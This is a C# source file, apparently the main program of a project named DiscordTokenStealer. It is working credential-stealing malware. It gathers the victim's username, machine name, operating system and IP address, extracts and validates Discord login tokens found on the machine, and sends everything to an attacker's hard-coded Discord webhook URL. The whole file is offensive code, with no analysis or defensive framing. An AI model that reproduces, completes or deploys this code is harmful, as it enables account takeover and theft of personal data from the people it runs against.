using System.Collections.Concurrent;
using Cysharp.Text;
using DiscordTokenStealer;
using DiscordTokenStealer.Discord;

using var content = ZString.CreateUtf8StringBuilder();
content.AppendLine($"Username: {Environment.UserName}");
content.AppendLine($"Machine Name: {Environment.MachineName}");
content.AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})");
content.AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}");
content.AppendLine("Token(s): ");

var loggedUsers = new ConcurrentBag<string>();
using var discordClient = new DiscordClient();
await foreach (var token in TokenParser.ParseAsync())
{
    if (await discordClient.LoginAsync(token) is not { } discordUser || loggedUsers.Contains(discordUser.Id))
        continue;
    content.Append(discordUser.ToString());
    loggedUsers.Add(discordUser.Id);
}

var message = content.ToString();

using var webhook = new DiscordWebhookClient("https://discord.com/api/webhooks/948319193005187142/MrCwuZJ1hOGAdwU1QucGn_rTl2xWXQlgR4t3ke9os1g-YMtgZuEazS92bL7X6tsDBHR6");
await webhook.SendMessage(new DiscordMessage(message));